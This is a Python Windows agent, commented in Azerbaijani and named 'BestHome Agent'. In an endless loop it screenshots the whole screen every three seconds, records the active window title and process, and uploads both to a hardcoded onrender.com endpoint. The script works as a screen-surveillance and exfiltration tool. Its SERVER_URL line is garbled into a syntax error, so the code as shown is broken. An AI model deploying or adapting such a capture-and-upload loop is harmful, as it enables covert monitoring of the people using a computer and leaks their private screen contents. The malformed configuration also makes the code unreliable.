import time
import io
import socket
import psutil
import requests
import os
import shutil
import platform
from datetime import datetime

# Screenshot dəstəyi
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
import traceback

import win32gui
import win32process

# ==========================================
# KONFİQURASİYA (BURANI DƏYİŞ!)
# ==========================================
# Əgər Render-ə yükləmisənsə, linki bura yaz. Məsələn: "https://besthome.onrender.com/upload"
SERVER_URL = "SERVER_URL = "https://server-dm3i.onrender.com/upload" 
PC_NAME = platform.node() # Daha dəqiq kompüter adı üçün
INTERVAL_SECONDS = 3 # Render üçün 1 saniyə çox sürətlidir, 3-5 saniyə məsləhətdir.
SAVE_PATH = "screens"

# =========================
#  UNIVERSAL SCREENSHOT
# =========================
def take_screenshot():
    try:
        if ImageGrab:
            # Bütün ekranı çəkir
            img = ImageGrab.grab()
            return img
        else:
            import pyscreenshot as ImageShot
            return ImageShot.grab()
    except Exception:
        print("Screenshot xətası:", traceback.format_exc())
        return None

# =========================
#   ACTIVE WINDOW INFO
# =========================
def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return "Məlum deyil", "UNKNOWN"

        title = win32gui.GetWindowText(hwnd)
        tid, pid = win32process.GetWindowThreadProcessId(hwnd)
        
        try:
            proc = psutil.Process(pid).name()
        except:
            proc = "UNKNOWN"

        return title, proc
    except:
        return "Məlum deyil", "UNKNOWN"

# =========================
#   SEND TO SERVER
# =========================
def send_data():
    img = take_screenshot()
    if img is None:
        return

    # Şəkli yaddaşda sıxırıq (Render serverini yormamaq üçün)
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=40) # 40 keyfiyyət həm aydın göstərir, həm də sürətlidir
    buf.seek(0)

    active_title, active_process = get_active_window_info()

    # Serverin gözlədiyi formatda məlumatları hazırlayırıq
    payload = {
        "pc_name": PC_NAME,
        "active_window": active_title,
        "active_process": active_process
    }

    files = {
        "screenshot": ("screen.jpg", buf, "image/jpeg")
    }

    try:
        # Timeout əlavə etdik ki, internet zəif olsa proqram donmasın
        r = requests.post(SERVER_URL, data=payload, files=files, timeout=10)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Göndərildi: {r.status_code}")
    except Exception as e:
        print(f"Serverə qoşulma xətası: {e}")

# =========================
#   MAIN LOOP
# =========================
def main():
    print(f"BestHome Agent aktivdir: {PC_NAME}")
    print(f"Server: {SERVER_URL}")
    
    while True:
        send_data()
        time.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    # Əgər köhnə şəkillər qalıbsa təmizləyək
    if os.path.exists(SAVE_PATH):
        try:
            shutil.rmtree(SAVE_PATH)
        except:
            pass
            
    main()
